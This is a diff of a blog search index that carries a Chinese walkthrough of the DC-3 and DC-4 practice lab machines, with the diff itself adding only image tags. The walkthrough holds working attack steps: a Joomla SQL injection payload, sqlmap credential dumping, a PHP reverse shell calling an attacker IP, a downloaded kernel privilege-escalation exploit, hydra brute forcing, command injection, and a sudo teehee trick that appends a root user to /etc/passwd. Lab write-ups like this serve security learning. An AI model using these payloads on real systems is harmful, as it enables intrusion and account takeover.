@@ -1472,16 +1472,16 @@
     <title>DC3-4靶机复现</title>
     <url>/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<h1 id="DC3-4靶机复现"><a href="#DC3-4靶机复现" class="headerlink" title="DC3-4靶机复现"></a>DC3-4靶机复现</h1><h2 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h2><h3 id="基础信息搜集"><a href="#基础信息搜集" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h3><p>老样子，上来还是基础流程，根据我们找到的mac地址，确定靶机地址</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png" class>
 
 <p>使用nmap查看目标靶机的详细端口开放</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.10.138</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>
 
 <p>可以看到只开放了80端口提供http页面，同时使用的是apache服务器，版本为2.4.18</p>
 <p>访问一下页面</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>
 
 <p>搜集到如下信息</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Joomla		cms管理系统</span><br><span class="line">Ubuntu		操作系统</span><br><span class="line">Apache		服务器2.4.18</span><br></pre></td></tr></table></figure>
@@ -1492,229 +1492,229 @@
 <h3 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h3><p>既然有cms，我们首先使用metasploit对于cms进行扫描</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>
 
 <p>发现有很多攻击模块，试试，发现没有一个成功的，这很恼火，那么我们使用dirb扫一下目录：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb 192.168.10.138</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>
 
 <p>挨着访问，我们发现了一个后台登录界面</p>
 <p><a href="http://192.168.10.138/administrator/index.php">http://192.168.10.138/administrator/index.php</a></p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36-16908701995612.png" class>
 
 <p>到这里不知道该怎么办，知道是cms</p>
 <p>但是我们这时候就有反骨了，突然想起来之前安装的advs这个漏洞扫描器还没用过，那就试试，设置好后，开始扫描</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png" class>
 
 <p>哇塞，全是漏洞（好富裕，一时间不知道该利用哪个），我们先从第一个开始看（点进去之后有漏洞描述）</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>
 
 <p>明显是一个sql注入漏洞，原理是没有对用户提供的数据进行充分处理</p>
 <h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>根据advs提供的漏洞讲解文章还有网上搜到的，我们得到如下payload</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,user()),1)</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>
 
 <p>经检验，漏洞确实存在，那接下来就到我们的懒狗快乐时间（使用sqlmap）</p>
 <p>爆库名</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; --dbs</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>
 
 <p>爆出来5个库，既然是joomla的cms，那我们就先看joomladb这个表</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D &quot;joomladb&quot; --tables</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>
 
 <p>爆出来76个表，既然我们想要弄到后台的信息，那我们就先看看users这个表，查列名</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>
 
 <p>得到了6个字段的东西，下一步肯定首先就是查id和password的东西了</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.10.138//index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C &quot;username,password&quot; --dump</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>
 
 <p>这密码一看就是加密过的，看起来很像md5解密，我们解密一手，但是这个使用md5在线工具解密失败了，所以我们上网搜了一下，尝试使用kali自带的john进行解密</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim 1.txt</span><br><span class="line">将密码复制进去</span><br><span class="line">john 1.txt</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>
 
 <p>得到密码，进行登录</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>
 
 <p>好，到这里已经是极限了，下面我是真不会了，只有乱测，乱点一通，但是没发现啥有用的，撑不下去了，还是乖乖的看wp吧</p>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>发现Extensions-&gt;Templates里面的模板可以修改执行PHP脚本</p>
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>
 
-
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>
 
 <p>那我们接下来就随便找一个路径书写我们想要的php程序</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>
 
 <p>往里面书写我们想要进行反弹shell的代码（一定要注意缩进）：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sock = fsockopen(&quot;192.168.79.128&quot;, &quot;5555&quot;);</span><br><span class="line"></span><br><span class="line">$descriptorspec = array(</span><br><span class="line"></span><br><span class="line">			0 =&gt; $sock,</span><br><span class="line"></span><br><span class="line">			1 =&gt; $sock,</span><br><span class="line"></span><br><span class="line">			2 =&gt; $sock</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open(&#x27;/bin/sh&#x27;, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>
 
 <p>点击save保存之后进行访问<a href="http://192.168.10.138/offline.php">http://192.168.10.138/offline.php</a></p>
 <p>在kali内对4441端口进行监听：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvvp 4441</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A320.png" class>
 
 <p>可以看到已经接收到shell</p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>拿到shell之后，进行了一些基础操作，包括通过python更改交互式shell，但显示权限不够，然后使用suid提权，发现也不行，这里就尝试进行系统漏洞提权</p>
 <p>查看发行版的详细信息</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/*release       #查看发行版信息</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A321.png" class>
 
 <p>可以看到是ubuntu的16.04的版本</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version  #查看内核版本的全部信息</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A322.png" class>
 
 <p>可以看到内核版本详细信息为4.4.0</p>
 <p>使用kali自带的漏洞库来进行系统漏洞的查找</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit ubuntu 16.04</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A323.png" class>
 
 <p>把内核对应版本的都试一下，可以发现39772.txt能用</p>
 <p>查看exp:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png" class>
 
 <p>下载地址就在下面，把压缩包下载到本地</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget  https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325.png" class>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启apache服务</span><br><span class="line">systemctl start apache2.service</span><br><span class="line"></span><br><span class="line">移动39772.zip到指定的apache的目录下，得到访问页面</span><br><span class="line">mv 39772.zip /var/www/html</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A326.png" class>
 
 <p>既然已经移到了web服务下面，那么我们访问虚拟机地址，如果是第一次使用记得删除&#x2F;var&#x2F;www&#x2F;html下的index.html文件</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A327.png" class>
 
 <p>既然已经出现在web目录下，那我们就在目标靶机的shell里下载攻击机上的exp</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.10.129/39772.zip</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A328.png" class>
 
 <p>解压exp</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip         #解压39772.zip</span><br><span class="line">cd 39772                #进入39772</span><br><span class="line">tar -xvf exploit.tar    #解压缩exploit.tar</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A329.png" class>
 
 <p>进入 ebpf_mapfd_doubleput_exploit 运行exp</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A330.png" class>
 
 <p>至于运行方法之前那个cat &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;39772.txt写了的</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png" class>
 
 <p>运行compile.sh ， doubleput即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A331.png" class>
 
 <p>可以看到提权成功，下一步就是进入root，直接得到flag就行</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-3%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A332.png" class>
 
 <h2 id="DC-4"><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h2><h2 id="基础信息搜集-1"><a href="#基础信息搜集-1" class="headerlink" title="基础信息搜集"></a>基础信息搜集</h2><p>老规矩，第一步：确定靶机IP和判断端口所开放的服务</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.10.0/24</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A3.png" class>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A- -p 192.168.10.137</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A32.png" class>
 
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22		开放ssh服务</span><br><span class="line">80		开放http服务/面板服务为nginx</span><br></pre></td></tr></table></figure>
 
 <p>使用dirb进行目录爆破：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://192.168.10.137/</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A34.png" class>
 
 <p>发现只有文件都被重定向到index.php，看样子不得不登陆了。</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A33.png" class>
 
 <h2 id="hydra爆破登录"><a href="#hydra爆破登录" class="headerlink" title="hydra爆破登录"></a>hydra爆破登录</h2><p>这里直接访问：192.168.10.137:80，看到上述界面，还是使用插件看看框架，发现只有nginx，我们试着搜一搜nginx1.15.10是否存在什么漏洞</p>
 <p>使用Metasploit进行探测和访问发现对于这个框架来讲并没有什么可以利用的，所有的对于这个框架的漏洞都不适用于这个nginx的版本，那么就尝试进行暴力破解</p>
 <p>我们使用hydra配合kali自带的字典进行破解</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/metasploit/password.lst -t 8 192.168.10.137 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot; -F</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A35.png" class>
 
 <p>可以看到爆破成功，密码为happy</p>
-<h2 id="命令查询"><a href="#命令查询" class="headerlink" title="命令查询"></a>命令查询</h2>
+<h2 id="命令查询"><a href="#命令查询" class="headerlink" title="命令查询"></a>命令查询</h2><img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A36.png" class>
 
 <p>我们点击Command，跳转到下一个页面</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A37.png" class>
 
 <p>随便选一个，我们点击run进行抓包</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A38.png" class>
 
 <p>很明显，我们可以知道radio参数就是执行命令的所传参数，那我们利用这个来执行命令</p>
 <p>既然有ssh服务，那我们就尝试看看能不能找到ssh登录的用户和密码，我们知道在kali下，用户目录一般在&#x2F;home下，所以我们进行查询</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A39.png" class>
 
 <p>发现了三个用户</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>
 
 <p>一一访问一下，charles和sam用户下面只有return to menu，但是在jim目录下发现了一些东西</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A310.png" class>
 
 <p>还是挨着访问一下</p>
 <p>还是只有backups下面有内容，cat看一下，发现是存储旧密码的一个文件</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A311.png" class>
 
 <h2 id="hydra爆破ssh密码"><a href="#hydra爆破ssh密码" class="headerlink" title="hydra爆破ssh密码"></a>hydra爆破ssh密码</h2><p>这下好了那我们就生成字典进行爆破登录ssh服务，因为这个是jim用户下的，所以我们用户名直接指定为jim就行</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P passwd.txt  192.168.10.137 ssh -v</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A312.png" class>
 
 <p>爆破成功我们进行连接</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.10.137 -p 22</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A313.png" class>
 
 <p>到这里简单的进一些重要文件看了看不知道该怎么办了，只有去看看wp，发现重点在&#x2F;var&#x2F;mail这个邮件目录下</p>
 <p>我们进行查看</p>
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A314.png" class>
 
 <p>我们可以看到邮件里又给出了一个针对于charles的密码，而我们之前使用burpsuite来找ssh服务用户时发现了三个用户，其中就有charles，我们来进行连接</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh charles@192.168.10.137 -p 22</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A315.png" class>
 
 <p>成功连接</p>
 <h2 id="teethe提权"><a href="#teethe提权" class="headerlink" title="teethe提权"></a>teethe提权</h2><p>登录进来之后首先想到的是进行查看suid提权的情况：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A316.png" class>
 
 <p>发现sudo是具有suid权限的，那我们使用sudo -l来看看哪些是具有sudo权限的：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A317.png" class>
 
 <p>可以看到teehee是不需要密码就可以使用的，那我们就去网上搜搜teehee命令是否存在提权</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">teehee是个小众的linux编辑器。如果有sudo权限。可以利用其来提权</span><br><span class="line"></span><br><span class="line">核心思路就是利用其在passwd文件中追加一条uid为0的用户条目</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;raaj::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A318.png" class>
 
 <p>可以看到成功以root身份进入shell</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /</span><br><span class="line">ls</span><br><span class="line">ls root</span><br><span class="line">cat root/flag.txt</span><br></pre></td></tr></table></figure>
 
-
+<img src="/2023/08/02/DC3-4%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/DC-4%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A319.png" class>
 
 <p>成功拿到了flag。</p>
 ]]></content>
